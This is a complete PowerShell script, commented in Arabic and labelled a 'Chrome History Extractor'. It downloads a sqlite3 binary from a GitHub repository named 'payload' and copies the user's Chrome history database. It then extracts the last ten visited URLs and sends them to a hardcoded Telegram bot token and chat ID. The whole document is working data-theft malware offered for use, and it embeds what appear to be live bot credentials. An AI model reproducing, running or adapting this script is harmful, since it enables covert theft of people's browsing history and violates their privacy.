# En9mm - Advanced Chrome History Extractor with Telegram Reporting

$Token  = "7921423137:AAHj4kDraZc0BRPk6c6j7TC2vJE5Dy-6j0g"
$ChatID = "774651165"
$Msg    = "🧠 *Chrome Last 10 Visited Sites:*\n"

# تحميل أداة SQLite إذا لم تكن موجودة
$sqlitePath = "$env:TEMP\sqlite3.exe"
if (-not (Test-Path $sqlitePath)) {
    Invoke-WebRequest -Uri "https://github.com/EN9M/payload/raw/main/sqlite3.exe" -OutFile $sqlitePath
}

# نسخ قاعدة بيانات Chrome
$chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$tempHistory   = "$env:TEMP\chrome_history.db"

if (Test-Path $chromeHistory) {
    Copy-Item $chromeHistory $tempHistory -Force

    # تنفيذ استعلام SQLite
    $query = "SELECT datetime((last_visit_time/1000000)-11644473600, 'unixepoch') as visit_time, url FROM urls ORDER BY last_visit_time DESC LIMIT 10;"
    $results = & $sqlitePath $tempHistory $query

    if ($results) {
        $Msg += "```\n$results\n```"
    } else {
        $Msg += "`n❌ *No data found in Chrome history.*"
    }
} else {
    $Msg += "`n⚠️ *Chrome history database not found.*"
}

# إرسال الرسالة إلى Telegram
$uri = "https://api.telegram.org/bot$Token/sendMessage"
Invoke-RestMethod -Uri $uri -Method POST -ContentType "application/json" -Body (@{
    chat_id = $ChatID
    text = $Msg
    parse_mode = "Markdown"
} | ConvertTo-Json -Depth 3)
